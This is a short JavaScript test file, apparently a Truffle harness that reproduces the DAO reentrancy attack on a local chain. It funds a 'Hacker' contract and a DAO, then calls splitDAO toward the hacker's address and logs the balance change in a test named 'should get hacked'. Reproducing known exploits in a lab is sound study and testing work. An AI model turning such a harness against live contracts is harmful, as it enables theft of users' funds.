contract('DAO', function(accounts) {
  it("should get hacked", function(done) {

    // Prepare hacker's contract with some Ether.
    var hacker = Hacker.deployed();
    hacker.allEvents(function(error, event){console.log(event.event, event.args);});

    // console.log('hacker', hacker.address);
    var value = 1000000000000000000;
    web3.eth.sendTransaction({value:value, from:accounts[0], to:hacker.address, gas:1000000});
    hackerBalance = web3.eth.getBalance(hacker.address);
    console.log('hackerBalance', hackerBalance);

    var contract = DAO.deployed();
    web3.eth.sendTransaction({value:value, from:accounts[0], to:contract.address, gas:1000000});
    contract.allEvents(function(error, event){console.log(event.event, event.args);});

    // Call Split DAO
    console.log('before', web3.eth.getBalance(hacker.address))
    contract.splitDAO.sendTransaction(hacker.address, value / 2, {from:accounts[0], gas:100000}).then(function(trx){
      console.log('sent to ', hacker.address)
      console.log('after', web3.eth.getBalance(hacker.address))
    })
    // .then(done).catch(done);
  });
});
